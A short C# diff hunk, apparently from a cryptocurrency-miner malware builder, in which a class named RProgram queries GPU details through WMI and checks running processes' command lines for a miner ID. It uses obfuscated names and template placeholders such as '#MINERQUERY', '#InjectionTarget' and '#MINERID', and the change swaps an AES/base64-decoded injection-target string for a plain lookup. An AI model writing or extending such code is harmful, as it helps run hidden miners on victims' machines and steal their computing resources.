@@ -58,7 +58,7 @@ public partial class RProgram
                 _rarg1_ += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]);
             }
 
-            var _rarg7_ = new ManagementObjectSearcher(_rarg5_, new ObjectQuery(string.Format(_rGetString_("#MINERQUERY"), Encoding.ASCII.GetString(_rAESMethod_(Convert.FromBase64String("#InjectionTarget")))))).Get();
+            var _rarg7_ = new ManagementObjectSearcher(_rarg5_, new ObjectQuery(string.Format(_rGetString_("#MINERQUERY"), _rGetString_("#InjectionTarget")))).Get();
             foreach (ManagementObject retObject in _rarg7_)
             {
                 if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains(_rGetString_("#MINERID")))
